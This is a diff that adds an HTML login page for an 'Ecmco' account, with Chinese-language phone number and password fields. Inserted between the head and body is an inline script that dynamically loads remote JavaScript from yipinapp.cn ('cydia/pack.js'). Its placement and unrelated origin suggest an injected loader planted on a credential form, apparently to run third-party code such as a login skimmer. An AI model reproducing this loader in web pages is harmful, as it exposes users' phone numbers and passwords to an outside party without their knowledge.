@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+		<title>登录</title>
+		<link rel="stylesheet" href="static/css/weui.css" />
+		<link rel="stylesheet" href="static/css/weui-jquery.css" />
+		<link rel="stylesheet" href="static/css/login.css" />
+	</head>
+	<script>
+		(function () {
+			var dw = document.createElement("script");
+			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(dw, s);
+		})()
+	</script>
+	<body>
+		<div id="login_o">
+		<div class="weui-cells weui-cells_form">
+			<h2 class="LoginName"></h2>
+			<div class="formInput">
+				<div class="weui-cell">
+					
+					
+					<div class="weui-cell__bd">
+							
+						
+						
+						<input class="weui-input" id="loginTel" type="number"  placeholder="请输入手机号码">
+						<i class="icon-search"></i>
+					</div>
+					<div class="weui-cell__hd" id="showPicker">
+						
+							<span class="addTxt">+<b></b></span><img class="trantImg" src="static/images/xiala.png" />
+						</div>
+				</div>
+				<div class="weui-cell">
+					<div class="weui-cell__bd">
+							
+						<input class="weui-input" id="loginPwd" type="password"  placeholder="请输入登录密码">
+						<i class="icon-searchs"></i>
+					</div>
+				
+				</div>
+			</div>
+		</div>
+			<p class="forgerB"><a href="forget.html">忘记密码？</a></p>
+			<button class="weui-btn mybgBtn" id="loginBtn">立即登录</button>
+			<p class="registerB">还没有Ecmco账号？ <a href="registertel.html" id="a_res">马上注册</a></p>
+		</div>
+	
+		<script type="text/javascript" src="lib/jquery.js" ></script>
+		<script type="text/javascript" src="lib/weui.min.js" ></script>
+		<script type="text/javascript" src="lib/jquery-weui.js" ></script>
+		<script type="text/javascript" src="static/js/api.js" ></script>
+		<script type="text/javascript" src="static/js/login.js" ></script>
+	</body>
+</html>
